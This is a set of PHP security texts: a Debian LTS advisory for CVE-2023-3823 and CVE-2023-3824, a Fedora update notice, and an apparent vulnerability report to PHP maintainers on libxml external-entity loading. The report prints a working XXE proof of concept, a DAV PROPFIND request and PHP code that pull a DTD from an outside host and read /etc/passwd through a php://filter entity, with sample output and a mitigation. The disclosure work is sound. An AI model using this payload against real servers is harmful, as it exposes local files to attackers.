Debian LTS Advisory DLA-3555-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                       Guilhem Moulin

-------------------------------------------------------------------------

Package        : php7.3
Version        : 7.3.31-1~deb10u5
CVE ID         : CVE-2023-3823 CVE-2023-3824

Security issues were found in PHP, a widely-used open source general
purpose scripting language, which could result in information
disclosure, denial of service or potentially remote code execution.

CVE-2023-3823

     Various XML functions rely on libxml global state to track
     configuration variables, like whether external entities are loaded.
     This state is assumed to be unchanged unless the user explicitly
     changes it by calling appropriate function.  Joas Schilling and
     Baptista Katapi discovered that, since the state is process-global,
     other modules — such as ImageMagick — may also use this library
     within the same process and change that global state for their
     internal purposes, and leave it in a state where external entities
     loading is enabled.  This can lead to the situation where external
     XML is parsed with external entities loaded, which can lead to
     disclosure of any local files accessible to PHP.  This vulnerable
     state may persist in the same process across many requests, until
     the process is shut down.

CVE-2023-3824

    Niels Dossche discovered that when loading a Phar file, while
    reading PHAR directory entries, insufficient length checking may
    lead to a stack buffer overflow, leading potentially to memory
    corruption or RCE.

For Debian 10 buster, these problems have been fixed in version
7.3.31-1~deb10u5.

We recommend that you upgrade your php7.3 packages.

For the detailed security status of php7.3 please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/php7.3>

Fedora Update Notification
FEDORA-2023-984c26961f
2023-08-12 04:19:56.585527
--------------------------------------------------------------------------------

Name : php
Product : Fedora 38
Version : 8.2.9
Release : 2.fc38
URL : <http://www.php.net/>
Summary : PHP scripting language for creating dynamic web sites
Description :
PHP is an HTML-embedded scripting language. PHP attempts to make it
easy for developers to write dynamically generated web pages. PHP also
offers built-in database integration for several commercial and
non-commercial database management systems, so writing a
database-enabled webpage with PHP is fairly simple. The most common
use of PHP coding is probably as a replacement for CGI scripts.

# Security issue with external entity loading in XML without enabling it

## Description

### Summary

After working on the issue some days, we more and more come to the assumption, that the actual issue is lower in the stack than the Nextcloud Server's PHP code. We were able to isolate it to a few lines of plain PHP code (but seemling only after performing a "Nextcloud login")

### Details

After working on the issue some days, we more and more come to the assumption, that the actual issue is lower in the stack than the Nextcloud Server's PHP code. We were able to isolate it to a few lines of plain PHP code (but seemling only after performing a "Nextcloud login"), see POC below.

#### Randomness

The behaviour seems to depend on some "random" factors. A suggestion at the moment is that it's working on the first run in a PHP/Apache process more often then on reused.

* We **were never able** to produce it on Nginx with PHP-FPM
* We **were never able** to produce it on CLI
* We **were able** to reproduce it with latest maintenance versions of PHP 8.0, 8.1 and 8.2 together with Apache2 on Debian
* We **were unable** to reproduce it with latest maintenance versions of PHP using Apache2 on Ubuntu, but the original reporter seems to be running on Ubuntu.

We are sorry that we are unable to give a clearer indication here, but think that the issue is to critical to ignore or keep to ourselves, just because we fail to give clear reproduction systems, because to us it seems like any system consuming XML is affected.

The most reliable system to reproduce it on is our "Developer Docker": <https://github.com/juliushaertl/nextcloud-docker-dev/#standalone-containers> but that comes with quite some overhead. The enabled PHP modules and PHPINFO output is available here <https://gist.github.com/juliushaertl/b458983b5fe87b31bd98ff2dc2468e97> On that system a Nextcloud user admin with password admin is automatically created and the attack can then be executed with a PROPFIND against the dav endpoint:

```
PROPFIND /remote.php/dav/files/<username>/

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "https://bin.icewind.me/r/p0gzLJ"> %remote; %intern; n%trick;]>
<d:propfind  xmlns:d="DAV:" xmlns:oc="http://owncloud.org/ns">
  <d:prop>
    <oc:fileid />
  </d:prop>
</d:propfind>

```

We hope that you can shed light on the situation, to help keeping the PHP world secure, by either confirm there is an issue somewhere inside PHP, libxml2, Apache2 or something else, or pointing us to something that brings clearness why it only happens sometimes.

### PoC

```
<?php
$xml= "<?xml version='1.0' encoding='utf-8' ?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"https://bin.icewind.me/r/p0gzLJ\"> %remote; %intern; %trick;]><D:propfind xmlns:D='DAV:'><D:allprop/></D:propfind>";
libxml_use_internal_errors(true);
$dom = new DOMDocument();
$dom->loadXML($xml);
echo $dom->textContent;
foreach (libxml_get_errors() as $error) {
		var_dump($error);
}
```

If you don't want to run code from our servers, you can replace `https://bin.icewind.me/r/p0gzLJ` with a link of your own, and make it serve the following content:

```
<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'file://WOOT%payload;WOOT'>">
```

The problem we are now facing is the following:

In most cases we correctly receive:

```
PEReference: %intern; not found on line …, column …

```

the reporter mentioned that when this happens we should try to run it multiple times, and indeed on some systems we received a different response after some runs:

```
WOOT{{base64 encoded content of /etc/passwd}}WOOT

```
### Mitigation

Our current "fix" to the problem is to set an external entity loader (although it's disabled by default and never enabled actively on our side)

```
libxml_set_external_entity_loader(function () { return null; });
```

In most cases that leaves the response unchanged with:

```
PEReference: %intern; not found on line …, column …

```

But in "successful" cases it now only responds with the following instead of the base64 encoded password file:

```
Failed to load external entity "NULL" on line 0, column 0

```

Interestingly setting the entity loader to null is **not** enough and still leaves the system vulnerable:

```
libxml_set_external_entity_loader(null);
```
### Impact

* What: The result is a XXE with potential to escalate into a RCE
* Who: Every application/library/server that is parsing/interacting with XML documents

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
